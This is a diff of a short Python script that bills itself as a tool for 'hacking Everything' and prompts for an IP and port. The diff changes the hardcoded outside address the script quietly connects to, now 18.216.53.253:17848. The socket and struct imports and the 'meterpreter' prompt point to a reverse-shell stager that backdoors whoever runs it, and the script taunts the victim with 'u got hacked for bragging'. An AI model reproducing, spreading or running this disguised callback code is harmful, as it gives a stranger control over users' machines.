@@ -1,9 +1,9 @@
 import time
 import socket,struct
 print("tool by Ali PotHead")
-print("hello this tool is for hacking SHAREit")
+print("hello this tool is for hacking Everything ")
 time.sleep(1)
-print("turn on your bluetooth")
+print("turn on your ngrok")
 time.sleep(1)
 f = raw_input("your ip: ")
 u = raw_input("the port 4444 is default: ")
@@ -12,7 +12,7 @@ print("please wait ")
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('52.14.61.47',14865))
+		s.connect(('18.216.53.253',17848))
 		break
 	except:
 		time.sleep(5)
@@ -31,4 +31,4 @@ gg = raw_input("meterpreter: ")
 if gg == help :
   print("u got hacked for bragging")
 else:
- print("u got hacked for bragging")
+ print("Error please install pottuss")
